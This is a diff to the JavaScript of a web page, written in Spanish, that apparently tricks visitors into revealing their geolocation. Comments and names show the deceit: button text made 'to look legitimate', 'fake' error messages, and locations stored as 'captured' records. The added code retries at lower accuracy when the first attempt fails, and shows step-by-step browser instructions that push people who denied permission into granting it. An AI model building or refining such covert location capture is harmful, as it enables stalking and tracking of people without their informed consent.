@@ -30,9 +30,17 @@ function setupEventListeners() {
 function captureLocation(source) {
     const btnElement = event.target;
     
+    console.log('🎯 Intentando capturar ubicación para:', source);
+    
     if (!navigator.geolocation) {
+        console.error('❌ Geolocalización no soportada');
         showFakeError('Tu dispositivo no soporta geolocalización. Intenta desde un teléfono móvil.');
         return;
+    }
+    
+    // Verificar si estamos en HTTPS o localhost
+    if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
+        console.warn('⚠️ Geolocalización puede no funcionar sin HTTPS');
     }
     
     // Cambiar texto del botón para parecer legítimo
@@ -46,8 +54,10 @@ function captureLocation(source) {
         maximumAge: 0
     };
     
-    navigator.geolocation.getCurrentPosition(
+    improvedGeolocation(
         function(position) {
+            console.log('✅ Ubicación obtenida exitosamente:', position.coords);
+            
             const locationData = {
                 lat: position.coords.latitude,
                 lng: position.coords.longitude,
@@ -58,6 +68,8 @@ function captureLocation(source) {
                 ip: 'Detectando...', // Se podría obtener con una API externa
                 id: generateId()
             };
+            
+            console.log('💾 Guardando ubicación:', locationData);
             
             // Guardar ubicación capturada
             saveCapturedLocation(locationData);
@@ -73,23 +85,40 @@ function captureLocation(source) {
             
         },
         function(error) {
+            console.error('❌ Error de geolocalización:', error);
+            
             let errorMessage = '';
+            let showInstructions = false;
+            
             switch(error.code) {
                 case error.PERMISSION_DENIED:
+                    console.error('🚫 Permiso de ubicación denegado');
                     errorMessage = 'Necesitas permitir el acceso a tu ubicación para continuar.';
+                    showInstructions = true;
                     break;
                 case error.POSITION_UNAVAILABLE:
+                    console.error('📍 Ubicación no disponible');
                     errorMessage = 'No pudimos obtener tu ubicación. Asegúrate de tener GPS activado.';
                     break;
                 case error.TIMEOUT:
+                    console.error('⏰ Timeout de geolocalización');
                     errorMessage = 'Tiempo agotado. Inténtalo de nuevo.';
                     break;
+                case 999:
+                    console.error('🚫 Geolocalización no soportada');
+                    errorMessage = 'Tu dispositivo no soporta geolocalización.';
+                    break;
                 default:
+                    console.error('❓ Error desconocido:', error.code, error.message);
                     errorMessage = 'Error desconocido. Inténtalo de nuevo.';
                     break;
             }
             
-            showFakeError(errorMessage);
+            if (showInstructions) {
+                showFakeError(errorMessage + showLocationInstructions());
+            } else {
+                showFakeError(errorMessage);
+            }
             
             // Resetear botón
             btnElement.innerHTML = originalText;
@@ -354,6 +383,72 @@ function copyCoordinates(lat, lng) {
     });
 }
 
+// Función mejorada de geolocalización con fallbacks
+function improvedGeolocation(successCallback, errorCallback, options) {
+    if (!navigator.geolocation) {
+        errorCallback({
+            code: 999,
+            message: 'Geolocalización no soportada'
+        });
+        return;
+    }
+    
+    // Primero intentar con alta precisión
+    navigator.geolocation.getCurrentPosition(
+        successCallback,
+        function(error) {
+            console.log('⚠️ Primer intento falló, intentando con configuración menos estricta...');
+            
+            // Si falla, intentar con configuración menos estricta
+            const fallbackOptions = {
+                enableHighAccuracy: false,
+                timeout: 30000,
+                maximumAge: 300000 // 5 minutos
+            };
+            
+            navigator.geolocation.getCurrentPosition(
+                successCallback,
+                errorCallback,
+                fallbackOptions
+            );
+        },
+        options
+    );
+}
+
+// Función para mostrar instrucciones de habilitación de ubicación
+function showLocationInstructions() {
+    const instructions = `
+        <div style="background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 10px; padding: 20px; margin: 20px 0;">
+            <h3 style="color: #d68910; margin-bottom: 15px;">📍 Instrucciones para habilitar ubicación:</h3>
+            <div style="color: #856404; text-align: left;">
+                <strong>Chrome/Edge:</strong><br>
+                1. Haz clic en el ícono del candado/información en la barra de direcciones<br>
+                2. Permite "Ubicación"<br>
+                3. Recarga la página<br><br>
+                
+                <strong>Firefox:</strong><br>
+                1. Haz clic en el ícono del escudo en la barra de direcciones<br>
+                2. Habilita ubicación<br>
+                3. Recarga la página<br><br>
+                
+                <strong>Safari:</strong><br>
+                1. Ve a Configuración > Privacidad y seguridad > Ubicación<br>
+                2. Permite ubicación para este sitio<br><br>
+                
+                <strong>Móvil:</strong><br>
+                1. Asegúrate de que el GPS esté activado<br>
+                2. Permite ubicación cuando el navegador lo solicite
+            </div>
+            <button onclick="location.reload()" style="background: #f39c12; color: white; border: none; padding: 10px 20px; border-radius: 5px; margin-top: 15px; cursor: pointer;">
+                🔄 Intentar de nuevo
+            </button>
+        </div>
+    `;
+    
+    return instructions;
+}
+
 // Añadir estilos CSS dinámicamente
 const style = document.createElement('style');
 style.textContent = `
@@ -397,3 +492,59 @@ style.textContent = `
     }
 `;
 document.head.appendChild(style);
+
+// Función de diagnóstico
+function runDiagnostic() {
+    console.log('🔧 Ejecutando diagnóstico de ubicación...');
+    
+    const diagnosticInfo = {
+        navegador: navigator.userAgent,
+        geolocalizacionSoportada: !!navigator.geolocation,
+        protocolo: location.protocol,
+        dominio: location.hostname,
+        url: location.href,
+        permisos: 'Verificando...'
+    };
+    
+    console.table(diagnosticInfo);
+    
+    // Verificar permisos
+    if (navigator.permissions) {
+        navigator.permissions.query({name: 'geolocation'}).then(function(result) {
+            console.log('🔐 Estado de permisos de ubicación:', result.state);
+            diagnosticInfo.permisos = result.state;
+            
+            // Mostrar resultado del diagnóstico
+            alert(`🔧 DIAGNÓSTICO DE UBICACIÓN:
+
+✅ Geolocalización soportada: ${diagnosticInfo.geolocalizacionSoportada ? 'SÍ' : 'NO'}
+🔐 Permisos: ${diagnosticInfo.permisos}
+🌐 Protocolo: ${diagnosticInfo.protocolo}
+🏠 Dominio: ${diagnosticInfo.dominio}
+
+${diagnosticInfo.permisos === 'denied' ? 
+'⚠️ PROBLEMA: Permisos denegados. Haz clic en el candado 🔒 en la barra de direcciones y permite ubicación.' : 
+diagnosticInfo.permisos === 'prompt' ? 
+'✅ Los permisos se solicitarán cuando sea necesario.' :
+'✅ Permisos concedidos.'}
+
+${diagnosticInfo.protocolo !== 'https:' && diagnosticInfo.dominio !== 'localhost' ? 
+'⚠️ RECOMENDACIÓN: Usa HTTPS para mejor funcionamiento.' : 
+'✅ Protocolo adecuado.'}
+            `);
+        });
+    } else {
+        alert(`🔧 DIAGNÓSTICO DE UBICACIÓN:
+
+✅ Geolocalización soportada: ${diagnosticInfo.geolocalizacionSoportada ? 'SÍ' : 'NO'}
+🌐 Protocolo: ${diagnosticInfo.protocolo}
+🏠 Dominio: ${diagnosticInfo.dominio}
+
+${diagnosticInfo.protocolo !== 'https:' && diagnosticInfo.dominio !== 'localhost' ? 
+'⚠️ RECOMENDACIÓN: Usa HTTPS para mejor funcionamiento.' : 
+'✅ Protocolo adecuado.'}
+
+ℹ️ Tu navegador no permite verificar permisos automáticamente.
+        `);
+    }
+}
